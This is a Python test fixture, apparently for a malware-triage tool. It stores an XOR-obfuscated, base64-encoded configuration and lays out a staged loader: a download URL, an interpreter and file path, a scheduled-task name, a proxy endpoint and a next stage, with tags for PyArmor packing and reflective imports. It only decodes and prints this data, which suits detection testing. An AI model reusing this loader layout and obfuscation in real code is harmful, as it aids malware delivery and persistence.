#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_bb8f774a = "x/rItMez1qbV6JjqheOK5oPctNuo3PCR8oP2n+2I16XArcK20/+b/p3ylvOsyaTGo8ejxqKO+YvilvOsyqPPqobii/iI6Z3+lsm5y6THotGi3r/busq+26mU94f+iuKN47zQv966363ymvuV8Z74nuKR5YTjhtm61aDOuoeyzr3Eqt6/x/qe95TgieaI6Zvivdmww7PSpsWt0b7cus+8377Ko8yin+2I7oLnhPCZ74rVu9q30o39kfCe4oHgkuCJ7J6j06rLudS7yZbmn/aY65/+kv6b6ZXii+WB7pnqtda+37bY5ZX6jeia6YHkiOS7z6D/j/aC6oXrl/SV+IjpgOeJ1r/b5oXkifmY8Zb41efS5dHg07WC5Ib6j/2RrMSwxLTH/dL9z/rN+cj7narMroDlnfyR4Y3oxq/Bt9a607eYrJX2zvmYq8rklO2R5JfygN++2bzSppvTpsi8zqvYq/uC9p7xn7CCt4C0hbbQ54Hjn/mQ/JnGttejy/a1j6Dwgu2K+Jn0sNGlxOuj1rjMvtuo25f2lLuV4JD0leGEqZuuma2cr8n+mPrUpN2hyKbSt8W1x6LWs8Ge7o/7k67t1/io2rXSoMGs6In9nLPjmu6G6YeqmK2arp+syv2b+dam36vDrMLsifGU6Jz9juW61LXYvYDTqtmtyKXwgOSF8ZS5i76JvYy/2e6I6pbmlPuD+qXArsq61bzSppuqmK+BsZ+vgbCKu4K3j7fLpcC4zJPglPWS98qmyarLp4ruh/SE5ZHymrTWt8O/17bYvNO104zlgbzsv++2m6iRpuPR6NzorJTVl6Karpw="
CODEC_bb8f774a = "base64_literal|rolling_xor|b1"

def load_bb8f774a():
    return base64.b64decode(MATERIAL_bb8f774a)

def decode_bb8f774a(stored_bytes):
    recovered_bytes = bytearray()
    prior_byte = 177
    for value in stored_bytes:
        recovered_bytes.append(value ^ prior_byte)
        prior_byte = value
    return bytes(recovered_bytes)

def recover_bb8f774a():
    harmless_value = "left" if 2 > 1 else "right"
    recovered_bytes = decode_bb8f774a(load_bb8f774a())
    configuration_text = recovered_bytes.decode("ascii", "strict")
    return configuration_text

def inspect_bb8f774a():
    return recover_bb8f774a()

def surface_bb8f774a():
    routes = {"selected": lambda: ("dictionary_dispatch", "reflective_name_plan", "pyarmor_pyinstaller", "powershell_to_python")}
    return routes["selected"]()

def obfuscation_bb8f774a():
    reflection_plan = ("__import__", "getattr", "reflective_name_plan")
    return reflection_plan[-1]

def plan_bb8f774a():
    fields = dict(item.split("=", 1) for item in inspect_bb8f774a().split("|"))
    analysis_surface = surface_bb8f774a()
    obfuscation_surface = obfuscation_bb8f774a()
    operation_plan = ("cpython_loader_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_bb8f774a())
